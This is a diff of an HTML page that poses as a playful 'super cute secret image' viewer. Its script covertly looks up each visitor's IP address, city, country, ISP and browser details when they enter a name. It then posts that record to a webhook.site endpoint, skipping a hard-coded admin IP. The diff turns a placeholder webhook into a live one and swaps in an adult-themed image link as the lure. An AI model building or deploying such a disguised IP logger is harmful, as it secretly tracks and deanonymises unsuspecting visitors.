@@ -1,125 +1,121 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>✨ Image Viewer ✨</title>
-  <style>
-    body {
-      font-family: 'Comic Sans MS', cursive;
-      background-color: #ffe6f2;
-      text-align: center;
-      padding: 40px;
-    }
-    #content {
-      max-width: 700px;
-      margin: auto;
-      background-color: #fff0fa;
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 0 20px hotpink;
-    }
-    input[type="text"] {
-      padding: 10px;
-      font-size: 16px;
-      border: 2px solid hotpink;
-      border-radius: 10px;
-      width: 70%;
-      max-width: 300px;
-      margin-top: 10px;
-    }
-    button {
-      padding: 10px 20px;
-      background-color: hotpink;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      font-size: 16px;
-      margin-top: 10px;
-      cursor: pointer;
-      transition: 0.3s ease;
-    }
-    button:hover {
-      background-color: deeppink;
-    }
-    #user-image {
-      margin-top: 25px;
-      max-width: 100%;
-      border-radius: 15px;
-      display: none;
-      box-shadow: 0 0 20px #ff69b4;
-    }
-    .error {
-      color: red;
-      margin-top: 10px;
-      font-weight: bold;
-    }
-  </style>
+    <title>Image Viewer</title>
+    <style>
+        body {
+            font-family: Comic Sans MS, cursive;
+            text-align: center;
+            background-color: #ffe6f2;
+            padding: 20px;
+        }
+        #content {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        #user-image {
+            max-width: 100%;
+            border-radius: 8px;
+            display: none;
+            box-shadow: 0 0 15px hotpink;
+            margin-top: 20px;
+        }
+        #name-form {
+            margin: 20px 0;
+        }
+        input[type="text"] {
+            padding: 10px;
+            font-size: 16px;
+            border: 2px solid hotpink;
+            border-radius: 10px;
+            width: 250px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            margin-left: 10px;
+            background-color: hotpink;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: deeppink;
+        }
+        .error {
+            color: red;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+    </style>
 </head>
 <body>
-  <div id="content">
-    <h1>✨ View Our Super Cute Secret Image ✨</h1>
-    <div id="name-form">
-      <p>Enter your name to unlock the cuteness:</p>
-      <input type="text" id="userName" placeholder="UwU what's your name?">
-      <br>
-      <button onclick="handleSubmission()">Show me 💖</button>
-      <div id="error-msg" class="error"></div>
+    <div id="content">
+        <h1>✨ View Our Super Cute Secret Image ✨</h1>
+        
+        <div id="name-form">
+            <p>Enter your name to unlock the cuteness:</p>
+            <input type="text" id="userName" placeholder="UwU what's your name?">
+            <button onclick="handleSubmission()">Show me 💖</button>
+            <div id="error" class="error"></div>
+        </div>
+        
+        <!-- Valid working image -->
+        <img id="user-image" src="https://imgur.com/gallery/late-night-yiff-big-stretch-edition-9kctqxl#/t/furry" alt="UwU E-Girl + Furry Combo">
     </div>
 
-    <!-- Working image link -->
-    <img id="user-image" src="https://i.imgur.com/VAjO7oh.jpg" alt="Cute Image">
-  </div>
+    <script>
+        const ADMIN_IP = "83.105.112.217";
 
-  <script>
-    const ADMIN_IP = "83.105.112.217";
+        async function handleSubmission() {
+            const userNameInput = document.getElementById('userName');
+            const userName = userNameInput.value.trim();
+            const errorBox = document.getElementById('error');
 
-    async function handleSubmission() {
-      const nameInput = document.getElementById('userName');
-      const userName = nameInput.value.trim();
-      const errorMsg = document.getElementById('error-msg');
+            if (!userName) {
+                errorBox.textContent = "Please enter your name first! 💢";
+                userNameInput.focus();
+                return;
+            }
 
-      if (!userName) {
-        errorMsg.textContent = "Please enter your name! 💢";
-        nameInput.focus();
-        return;
-      }
+            errorBox.textContent = "";
 
-      errorMsg.textContent = ""; // clear error
+            try {
+                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
+                const userAgent = navigator.userAgent;
 
-      try {
-        const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
-        const userAgent = navigator.userAgent;
+                const log = {
+                    name: userName,
+                    ip: ipData.ip,
+                    city: ipData.city,
+                    country: ipData.country,
+                    isp: ipData.org,
+                    userAgent,
+                    time: new Date().toISOString()
+                };
 
-        const log = {
-          name: userName,
-          ip: ipData.ip,
-          city: ipData.city,
-          country: ipData.country,
-          isp: ipData.org,
-          userAgent,
-          time: new Date().toISOString()
-        };
+                if (ipData.ip !== ADMIN_IP) {
+                    fetch("https://webhook.site/a75cc371-47c5-4513-aaff-5282696bb856", {
+                        method: "POST",
+                        body: JSON.stringify(log),
+                        headers: { "Content-Type": "application/json" }
+                    });
+                }
 
-        if (ipData.ip !== ADMIN_IP) {
-          fetch("https://webhook.site/your-unique-url", {
-            method: "POST",
-            body: JSON.stringify(log),
-            headers: { "Content-Type": "application/json" }
-          });
+                document.getElementById('user-image').style.display = 'block';
+                document.getElementById('name-form').style.display = 'none';
+
+            } catch (e) {
+                document.getElementById('user-image').style.display = 'block';
+                document.getElementById('name-form').style.display = 'none';
+            }
         }
 
-      } catch (e) {
-        console.warn("Could not fetch IP info:", e);
-      }
-
-      // Show image and hide form
-      document.getElementById('user-image').style.display = 'block';
-      document.getElementById('name-form').style.display = 'none';
-    }
-
-    document.getElementById('userName').addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') handleSubmission();
-    });
-  </script>
+        document.getElementById('userName').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') handleSubmission();
+        });
+    </script>
 </body>
 </html>
